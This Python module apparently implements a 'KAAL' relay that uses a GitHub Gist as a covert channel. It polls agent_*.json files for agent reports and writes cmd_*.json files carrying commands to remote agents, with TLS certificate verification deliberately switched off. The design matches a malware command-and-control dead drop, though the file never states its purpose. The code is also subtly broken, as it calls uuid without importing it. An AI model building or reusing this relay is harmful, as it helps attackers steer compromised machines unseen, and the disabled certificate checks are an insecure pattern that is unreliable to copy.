"""
GitHub Gist Relay – Polls Gist for agent messages, handles rate limits, task status.
"""

import json
import time
import urllib.request
import urllib.parse
import ssl
from core.logger import setup_logger
import threading
import random

log = setup_logger("github_relay")

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE

class GitHubGistRelay:
    def __init__(self, token: str, gist_id: str):
        self.token = token
        self.gist_id = gist_id
        self.api_base = "https://api.github.com"
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "KAAL-Relay/1.0",
        }
        self.file_hashes = {}          # filename -> last content
        self.burst_until = 0
        self.last_etag = None
        self.poll_interval = 30         # default idle interval
        self.base_interval = 30
        self.burst_interval = 3
        self.rate_limit_remaining = 5000
        self.rate_limit_reset = 0

        log.info(f"GitHubGistRelay initialized: {gist_id}")

    def trigger_burst(self, duration=30):
        self.burst_until = time.time() + duration
        self.poll_interval = self.burst_interval

    def is_burst_mode(self):
        now = time.time()
        if now < self.burst_until:
            return True
        self.poll_interval = self.base_interval
        return False

    def _make_request(self, url, headers):
        """Perform GET with ETag and rate limit handling."""
        if self.last_etag:
            headers["If-None-Match"] = self.last_etag
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=15, context=_ssl_ctx) as resp:
                if 'ETag' in resp.headers:
                    self.last_etag = resp.headers['ETag']
                # Rate limit headers
                if 'X-RateLimit-Remaining' in resp.headers:
                    self.rate_limit_remaining = int(resp.headers['X-RateLimit-Remaining'])
                if 'X-RateLimit-Reset' in resp.headers:
                    self.rate_limit_reset = int(resp.headers['X-RateLimit-Reset'])
                data = json.loads(resp.read().decode())
                return data
        except urllib.error.HTTPError as e:
            if e.code == 304:
                return None  # Not Modified
            elif e.code in (403, 429):
                # Rate limit exceeded
                log.warning(f"Rate limit hit (HTTP {e.code})")
                # Parse reset time if available
                reset = e.headers.get('X-RateLimit-Reset')
                if reset:
                    reset_time = int(reset)
                    sleep_time = max(reset_time - time.time(), 60)
                    log.info(f"Rate limit reset in {sleep_time:.0f}s")
                    time.sleep(sleep_time)
                else:
                    # exponential backoff with jitter
                    backoff = random.uniform(10, 30)
                    log.info(f"Backing off for {backoff:.1f}s")
                    time.sleep(backoff)
                return None
            else:
                log.error(f"GitHub API error {e.code}")
                return None
        except Exception as e:
            log.error(f"Request error: {e}")
            return None

    def get_messages(self):
        """Yield all new messages from the gist."""
        url = f"{self.api_base}/gists/{self.gist_id}"
        data = self._make_request(url, self.headers.copy())
        if data is None:
            return

        files = data.get("files", {})
        for filename, file_data in files.items():
            if not (filename.startswith("agent_") and filename.endswith(".json")):
                continue
            content = file_data.get("content", "")
            if not content:
                continue
            prev = self.file_hashes.get(filename)
            if content == prev:
                continue
            self.file_hashes[filename] = content
            log.info(f"[{filename}] changed")
            self.trigger_burst(30)
            yield from self._decode_content(content, filename)

    def _decode_content(self, content, filename=""):
        """Extract KAAL messages from content."""
        try:
            decoded = json.loads(content)
        except json.JSONDecodeError:
            decoded = content
        if isinstance(decoded, str) and decoded.startswith("KAAL_RELAY_MSG:"):
            try:
                inner = json.loads(decoded[15:])
                yield inner
            except:
                pass
        elif isinstance(decoded, dict):
            yield decoded

    def send_command(self, agent_id: str, command: str, task_id: str = None):
        """Write a command to the agent's command file."""
        safe_id = agent_id.replace(" ", "_").replace("/", "_").replace("\\", "_")
        cmd_file = f"cmd_{safe_id}.json"
        if not task_id:
            task_id = str(uuid.uuid4())
        msg = {
            "type": "command",
            "agent_id": agent_id,
            "task_id": task_id,
            "command": command,
            "timestamp": time.time()
        }
        content = f"KAAL_RELAY_MSG:{json.dumps(msg)}"
        return self._write_file(cmd_file, content)

    def _write_file(self, filename, content):
        url = f"{self.api_base}/gists/{self.gist_id}"
        payload = json.dumps({"files": {filename: {"content": content}}})
        headers = self.headers.copy()
        headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=payload.encode(), headers=headers, method="PATCH")
        try:
            with urllib.request.urlopen(req, timeout=15, context=_ssl_ctx) as resp:
                return True
        except Exception as e:
            log.error(f"Write error: {e}")
            return False
